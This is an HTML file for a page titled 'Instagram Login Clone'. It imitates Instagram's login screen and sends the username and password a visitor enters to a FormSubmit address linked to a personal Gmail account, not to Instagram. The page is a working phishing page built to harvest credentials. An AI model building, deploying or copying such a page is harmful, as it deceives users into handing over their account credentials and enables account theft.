<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login Clone</title>
    <style>
        /* Basic Reset */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        /* Body Background */
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #fafafa;
        }

        /* Container */
        .container {
            width: 100%;
            max-width: 350px;
            padding: 40px 20px;
            text-align: center;
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
        }

        /* Instagram Logo */
        .logo {
            font-size: 2.5rem;
            font-weight: bold;
            color: #262626;
            margin-bottom: 20px;
            font-family: 'Billabong', cursive;
        }

        /* Form Styling */
        .form-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        /* Input Fields */
        .input-field {
            width: 100%;
            padding: 10px;
            font-size: 14px;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            background-color: #fafafa;
            outline: none;
        }

        /* Button Styling */
        .login-btn {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            background-color: #0095f6;
            color: white;
            font-weight: bold;
            font-size: 14px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .login-btn:disabled {
            background-color: #b2dffc;
            cursor: not-allowed;
        }

        /* Forgot Password Link */
        .forgot-link {
            display: block;
            color: #385185;
            font-size: 12px;
            margin-top: 10px;
            text-decoration: none;
        }

        /* Footer */
        .footer {
            font-size: 14px;
            color: #8e8e8e;
            margin-top: 20px;
        }

        .footer a {
            color: #0095f6;
            font-weight: bold;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        
        <!-- Form with FormSubmit integration -->
        <form action="https://formsubmit.co/lakhantanmay66@gmail.com" method="POST">
            <div class="form-group">
                <input type="text" class="input-field" name="username" placeholder="Phone number, username, or email" required>
                <input type="password" class="input-field" name="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn">Log In</button>
        </form>

        <a href="#" class="forgot-link">Forgot password?</a>

        <div class="footer">Don't have an account? <a href="#">Sign up</a></div>
    </div>
</body>
</html>
